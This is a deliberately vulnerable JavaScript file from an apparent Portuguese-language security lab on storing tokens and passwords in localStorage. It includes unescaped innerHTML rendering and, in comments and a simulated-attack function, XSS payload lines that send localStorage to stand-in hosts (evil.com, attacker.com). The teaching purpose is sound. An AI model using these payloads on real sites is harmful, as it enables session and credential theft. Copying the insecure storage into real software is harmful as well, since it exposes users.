// ╔══════════════════════════════════════════════════════╗
// ║  LAB 04 — VERSÃO VULNERÁVEL                         ║
// ║  ⚠️  Dados sensíveis em localStorage                ║
// ╚══════════════════════════════════════════════════════╝

// VULNERABILIDADE: o token JWT, senha e dados do usuário
// são salvos diretamente no localStorage.
// localStorage é acessível por QUALQUER script na página.
// Se houver XSS, um atacante roba tudo com uma linha.

function fazerLogin() {
  const user = document.getElementById('loginUser').value;
  const pass = document.getElementById('loginPass').value;

  if (!user || !pass) return;

  // Simula resposta de um servidor (token fictício)
  const tokenFalso = btoa(JSON.stringify({
    user, role: 'admin', exp: Date.now() + 86400000
  }));

  // ❌ INSEGURO: salvando tudo no localStorage
  localStorage.setItem('jwt_token', tokenFalso);
  localStorage.setItem('user_email', user + '@empresa.com');
  localStorage.setItem('user_role', 'admin');
  localStorage.setItem('user_pass_hash', btoa(pass)); // nunca faça isso!
  localStorage.setItem('session_id', 'sess_' + Math.random().toString(36).slice(2));

  atualizarUI(user);
  atualizarStorage();
}

function atualizarUI(user) {
  document.getElementById('panelLogin').style.display = 'none';
  document.getElementById('panelUser').style.display = 'block';
  document.getElementById('panelUser').classList.remove('panel-hidden');
  document.getElementById('userInfo').innerHTML =
    'Bem-vindo, <span>' + user + '</span><br>' +
    'Role: <span>' + localStorage.getItem('user_role') + '</span><br>' +
    'Session: <span>' + localStorage.getItem('session_id') + '</span>';
  document.querySelector('.status-dot').classList.add('online');
  document.getElementById('statusText').textContent = user;
}

function atualizarStorage() {
  const view = document.getElementById('storageView');
  const keys = Object.keys(localStorage);
  if (keys.length === 0) {
    view.innerHTML = '<span class="empty-msg">Nenhum dado armazenado ainda</span>';
    return;
  }
  view.innerHTML = keys.map(k =>
    `<div class="storage-item"><span class="s-key">${k}:</span><span class="s-val">${localStorage.getItem(k)}</span></div>`
  ).join('');
}

// ❌ Simula um ataque XSS que roba o localStorage
// Um payload real seria: <img src=x onerror="fetch('https://evil.com?d='+btoa(JSON.stringify(localStorage)))">
function roubarDados() {
  const dados = {};
  Object.keys(localStorage).forEach(k => dados[k] = localStorage.getItem(k));

  const log = document.getElementById('attackLog');
  const panel = document.getElementById('panelLog');

  if (Object.keys(dados).length === 0) {
    alert('Faça login primeiro para ver o ataque!');
    return;
  }

  log.textContent =
    '// PAYLOAD XSS EXECUTADO\n' +
    '// fetch("https://attacker.com/steal?data=" + btoa(JSON.stringify(localStorage)))\n\n' +
    '// DADOS ROUBADOS:\n' +
    JSON.stringify(dados, null, 2) + '\n\n' +
    '// Token decodificado:\n' +
    JSON.stringify(JSON.parse(atob(dados.jwt_token || btoa('{}'))), null, 2);

  panel.style.display = 'block';
}

function fazerLogout() {
  localStorage.clear();
  location.reload();
}

atualizarStorage();